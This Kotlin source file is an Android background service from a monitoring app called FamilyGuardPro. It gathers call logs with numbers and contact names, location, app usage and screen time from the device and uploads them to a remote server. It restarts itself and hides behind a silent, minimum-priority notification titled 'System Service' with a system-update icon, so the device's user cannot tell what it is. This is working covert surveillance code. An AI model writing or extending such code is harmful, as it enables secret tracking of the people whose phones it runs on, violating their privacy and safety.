package com.familyguardpro.services

import android.app.Service
import android.content.Intent
import android.os.IBinder
import android.util.Log
import androidx.core.app.NotificationCompat
import com.familyguardpro.FamilyGuardApp
import com.familyguardpro.R
import com.familyguardpro.network.ApiClient
import com.familyguardpro.utils.DataCollector
import com.familyguardpro.utils.PreferenceManager
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.SupervisorJob
import kotlinx.coroutines.launch

class DataSyncService : Service() {

    companion object {
        private const val TAG = "DataSyncService"
        private const val NOTIFICATION_ID = 1005
    }

    private val serviceScope = CoroutineScope(SupervisorJob() + Dispatchers.IO)
    private lateinit var preferenceManager: PreferenceManager

    override fun onCreate() {
        super.onCreate()
        preferenceManager = PreferenceManager(this)
        startForegroundNotification()
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        when (intent?.action) {
            "SYNC_NOW" -> syncData()
            else -> Log.d(TAG, "Service started")
        }
        return START_STICKY
    }

    override fun onBind(intent: Intent?): IBinder? = null

    private fun startForegroundNotification() {
        val notification = NotificationCompat.Builder(this, FamilyGuardApp.NOTIFICATION_CHANNEL_HIDDEN)
            .setContentTitle("System Service")
            .setContentText("Running")
            .setSmallIcon(R.drawable.ic_system_update)
            .setPriority(NotificationCompat.PRIORITY_MIN)
            .setOngoing(true)
            .setShowWhen(false)
            .setSilent(true)
            .build()

        startForeground(NOTIFICATION_ID, notification)
    }

    private fun syncData() {
        serviceScope.launch {
            try {
                val deviceId = preferenceManager.getDeviceId()
                if (deviceId.isEmpty()) {
                    Log.w(TAG, "No device ID, skipping sync")
                    return@launch
                }

                val dataCollector = DataCollector(this@DataSyncService)
                val syncData = dataCollector.collectAllData()

                // Build proper request body
                val appsFormatted = syncData.appUsage?.map { app ->
                    com.familyguardpro.network.AppUsageItem(
                        packageName = app.packageName,
                        appName = app.appName,
                        usageTime = app.usageTimeMinutes.toLong(),
                        openCount = 1
                    )
                } ?: emptyList()
                
                val callLogsFormatted = syncData.callLogs?.map { call ->
                    com.familyguardpro.network.CallLogItem(
                        number = call.phoneNumber,
                        name = call.contactName,
                        type = call.callType,
                        duration = call.durationSeconds.toLong(),
                        timestamp = call.timestamp
                    )
                } ?: emptyList()
                
                val locationItem = syncData.lastLocation?.let {
                    com.familyguardpro.network.LocationItem(
                        latitude = it.latitude,
                        longitude = it.longitude,
                        accuracy = it.accuracy,
                        timestamp = System.currentTimeMillis()
                    )
                }
                
                val body = com.familyguardpro.network.SyncRequestBody(
                    battery = syncData.batteryLevel ?: 0,
                    screenTime = syncData.screenTimeMinutes ?: 0,
                    apps = appsFormatted,
                    callLogs = callLogsFormatted,
                    location = locationItem,
                    notifications = emptyList()
                )

                val response = ApiClient.api.uploadData(deviceId, body)
                if (response.success) {
                    preferenceManager.setLastSyncTime(System.currentTimeMillis())
                    Log.d(TAG, "Data synced successfully")
                } else {
                    Log.e(TAG, "Sync failed: ${response.message}")
                }
            } catch (e: Exception) {
                Log.e(TAG, "Error syncing data", e)
            }
        }
    }

    override fun onDestroy() {
        super.onDestroy()
        Log.d(TAG, "DataSyncService destroyed")
    }
}
